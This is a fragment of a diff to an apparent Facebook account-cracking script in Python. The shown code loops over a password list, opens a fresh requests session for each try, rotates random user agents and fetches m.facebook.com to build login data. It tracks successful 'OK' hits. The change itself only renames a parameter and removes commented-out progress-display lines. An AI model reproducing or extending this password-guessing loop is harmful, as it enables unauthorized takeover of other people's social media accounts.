@@ -1202,7 +1202,7 @@ def m5(idf,pwv):
   pass 
 
 
-def m6(idf,pwv):
+def m6(idf,pw):
  global loop
  global ok
  global agents
@@ -1211,9 +1211,6 @@ def m6(idf,pwv):
  try:
   for ps in pw:
    session = requests.Session()
-            #animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING","\x1b[1;97mKING","\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKING","\x1b[1;96mKING"])
-            #sys.stdout.write(f'\r     {K}[{H}{animasi}{P}/{A}%s{K}]{N}OK{B}>{H}%s'%(loop,len(ok))),
-            #sys.stdout.flush()
    pro = random.choice(ugen)
    free_fb = session.get('https://m.facebook.com').text
    log_data = {
